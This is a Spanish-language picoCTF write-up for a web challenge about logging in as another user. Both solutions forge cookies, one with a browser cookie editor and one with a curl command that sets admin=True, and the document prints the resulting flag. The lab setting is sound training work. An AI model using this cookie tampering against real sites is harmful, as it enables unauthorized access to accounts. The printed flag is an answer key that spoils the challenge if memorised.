## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/15796/` ([link](https://jupiter.challenges.picoctf.org/problem/15796/)) or http://jupiter.challenges.picoctf.org:15796
## Solución 1
- Ingreso o inicio sesión con otro nombre de usuario que no sea Joe y una contraseña cualquiera para poder entrar.
- Uzo la herramienta de cookie-editor y modifico el valor que viene por "True" en el campo de admin.
- Y al final refresco la pagina.
```
picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}
```
## Solución 2
```
armandopc-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/44573/flag -H 'Cookie: password=hola; username=Juan; admin=True' | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}</code></p>
armandopc-picoctf@webshell:~$ 
```

## Notas Adicionales
-s - Para que no nos muestre la información de descarga.
-H - Envía un encabezado.

## Referencias
- [jQuery - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/JQuery)
- [Bootstrap (framework) - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/Bootstrap_(framework))
- [Cookie (informática) - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica))
- [HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)
- [HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [Request header](https://developer.mozilla.org/en-US/docs/Glossary/Request_header)
- [Response header](https://developer.mozilla.org/en-US/docs/Glossary/Response_header)
- [HTTP request methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- [HTTP response status codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)